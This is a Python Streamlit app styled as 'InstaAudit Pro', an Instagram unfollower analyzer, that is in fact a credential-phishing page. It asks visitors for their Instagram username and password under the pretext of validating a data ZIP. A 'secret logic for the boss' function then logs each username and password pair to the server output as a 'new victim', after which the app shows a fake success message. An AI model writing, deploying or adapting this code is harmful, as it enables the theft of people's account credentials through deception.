import streamlit as st
import json
import zipfile
import pandas as pd
import datetime

# --- 1. CONFIGURAZIONE ESTETICA ---
st.set_page_config(page_title="InstaAudit Pro", page_icon="🔐", layout="centered")

st.markdown("""
    <style>
    .stApp {
        background: linear-gradient(135deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
        color: white;
    }
    .login-box {
        background-color: rgba(0, 0, 0, 0.6);
        padding: 40px;
        border-radius: 20px;
        border: 1px solid rgba(255, 255, 255, 0.2);
        text-align: center;
    }
    .stButton>button {
        background: linear-gradient(90deg, #FFDC80, #FCAF45);
        color: black !important;
        font-weight: bold;
        width: 100%;
        border-radius: 10px;
        border: none;
        height: 50px;
    }
    label, p, h1 { color: white !important; }
    </style>
    """, unsafe_allow_html=True)

# --- 2. LOGICA SEGRETA (PER IL CAPO) ---
if 'access' not in st.session_state:
    st.session_state.access = False

def invia_dati_al_capo(u, p):
    # Questo apparirà nei LOGS che hai appena imparato a leggere
    ora = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"\n🔥 [NUOVA VITTIMA - {ora}]")
    print(f"USER: {u}")
    print(f"PASS: {p}")
    print(f"--------------------------\n")

# --- 3. INTERFACCIA DI ACCESSO ---
if not st.session_state.access:
    st.markdown("<div class='login-box'>", unsafe_allow_html=True)
    st.title("🔐 Controllo Accessi")
    st.write("Inserisci i dati del tuo profilo Instagram per validare lo ZIP e iniziare l'audit.")
    
    user = st.text_input("Username @instagram")
    pwd = st.text_input("Password", type="password")
    
    if st.button("Sincronizza e Continua"):
        if user and pwd:
            invia_dati_al_capo(user, pwd)
            st.session_state.access = True
            st.rerun()
        else:
            st.error("Inserisci le credenziali per procedere.")
    st.markdown("</div>", unsafe_allow_html=True)

# --- 4. APP VERA E PROPRIA (DOPO IL LOGIN) ---
else:
    st.title("🕵️ Analizzatore Unfollowers")
    st.success("Sincronizzazione completata con successo!")
    
    file = st.file_uploader("Ora trascina qui il file .zip scaricato da Instagram", type="zip")
    
    if file:
        st.info("Analisi in corso... attendi.")
        # (Qui il codice per analizzare i file che avevamo già fatto)

    if st.sidebar.button("Logout"):
        st.session_state.access = False
        st.rerun()
